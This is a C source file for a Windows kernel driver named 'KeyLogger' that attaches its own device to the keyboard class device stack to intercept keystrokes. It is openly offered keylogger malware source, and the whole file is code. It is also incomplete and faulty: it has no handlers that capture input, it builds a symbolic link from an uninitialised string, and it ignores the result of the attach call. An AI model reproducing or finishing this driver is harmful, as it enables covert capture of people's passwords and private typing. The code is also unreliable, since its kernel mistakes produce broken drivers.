#include <ntddk.h>
#include <tchar.h>

#define DEVICE_NAME _T("KeyLogger")
#define DEVICE_PATH _T("\\Device\\") DEVICE_NAME

#define KEYBOARD_DEVICE_NAME _T("KeyboardClass0")
#define KEYBOARD_DEVICE_PATH _T("\\Device\\") KEYBOARD_DEVICE_NAME

#define SYM_LINK_NAME _T("\\DosDevices\\KeyLogger")

typedef struct _DEVICE_EXTENSION
{
	UNICODE_STRING symbolicLink;
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

NTSTATUS addDeviceRoutine(_In_ PDRIVER_OBJECT pDriverObject, _In_ PDEVICE_OBJECT pPhysicalDeviceObject)
{
	(VOID)pPhysicalDeviceObject;
	(VOID)pDriverObject;

	UNICODE_STRING deviceName;
	RtlInitUnicodeString(&deviceName, DEVICE_PATH);

	PDEVICE_OBJECT pDeviceObj;
	NTSTATUS returnedStatus;

	returnedStatus = IoCreateDevice(
		pDriverObject,
		sizeof(DEVICE_EXTENSION),
		&deviceName,
		FILE_DEVICE_UNKNOWN,
		0,
		FALSE,
		&pDeviceObj);

	if (!NT_SUCCESS(returnedStatus))
		return returnedStatus;

	UNICODE_STRING targetDeviceName;
	RtlInitUnicodeString(&targetDeviceName, KEYBOARD_DEVICE_PATH);

	PFILE_OBJECT pFileObj;
	PDEVICE_OBJECT pTargetDeviceObj;

	returnedStatus = IoGetDeviceObjectPointer(
		&targetDeviceName,
		FILE_READ_DATA,
		&pFileObj,
		&pTargetDeviceObj);

	if (!NT_SUCCESS(returnedStatus))
		return returnedStatus;

	IoAttachDeviceToDeviceStack(pDeviceObj, pTargetDeviceObj);

	returnedStatus = IoCreateSymbolicLink(&((PDEVICE_EXTENSION)pDeviceObj->DeviceExtension)->symbolicLink, &deviceName);

	if (!NT_SUCCESS(returnedStatus))
		return returnedStatus;

	return STATUS_SUCCESS;
}


NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT pDriverObject, _In_ PUNICODE_STRING pRegistryPath)
{
	(VOID)pRegistryPath;

	pDriverObject->DriverExtension->AddDevice = addDeviceRoutine;

	return STATUS_SUCCESS;
}